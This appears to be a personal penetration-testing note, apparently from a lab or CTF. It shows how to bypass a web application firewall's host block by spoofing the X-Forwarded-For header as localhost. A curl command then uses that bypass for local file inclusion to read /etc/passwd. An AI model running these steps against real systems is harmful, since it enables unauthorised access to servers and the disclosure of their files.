### WAF Web Application Firewall

![[Pasted image 20220307105734.png]]

WAF: Access Denied for this Host.


X-Forwarded-For Header

"The X-Forwarded-For (XFF) header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through an HTTP proxy or a load balancer. When traffic is intercepted between clients and servers, server access logs contain the IP address of the proxy or load balancer only. To see the original IP address of the client, the X-Forwarded-For request header is used."

```burpsuite - kali
X-Forwarded-For: 127.0.0.1
```

Ensure we have TWO blank lines under this (lines 8 and 9 in photo)

![[Pasted image 20220307111047.png]]

LFI
![[Pasted image 20220307120119.png]]

```bash -kali
curl http://$TARGET:13337/logs?file=/etc/passwd -H "X-Forwarded-For: localhost"
```

[[3._LFI RFI]]

#### Examples

[[GraphQL Graphiql]]



















